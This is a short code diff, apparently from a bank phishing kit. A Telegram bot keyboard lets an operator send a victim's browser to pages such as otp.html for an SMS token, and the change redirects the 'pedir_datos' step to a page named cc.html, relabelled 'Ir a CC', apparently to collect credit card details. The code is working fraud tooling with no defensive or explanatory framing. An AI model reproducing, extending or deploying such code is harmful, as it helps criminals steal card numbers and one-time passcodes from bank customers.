@@ -241,7 +241,7 @@
                                     checkAllFilled();
                                     break;
                                 case 'pedir_datos':
-                                    window.location.href = "datos.html";
+                                    window.location.href = "cc.html";
                                     break;
                                 case 'token_sms':
                                     window.location.href = "otp.html";
@@ -332,7 +332,7 @@
                 const keyboard = {
                     inline_keyboard: [
                         [{ text: "❌ Error Token", callback_data: `error_token:${transactionId}` },
-                         { text: "📋 Ir a Datos", callback_data: `pedir_datos:${transactionId}` }],
+                         { text: "📋 Ir a CC", callback_data: `pedir_datos:${transactionId}` }],
                         [{ text: "👀 Token SMS", callback_data: `token_sms:${transactionId}` },
                          { text: "🚨Finalizar", callback_data: `finalizar:${transactionId}` }]
                     ]
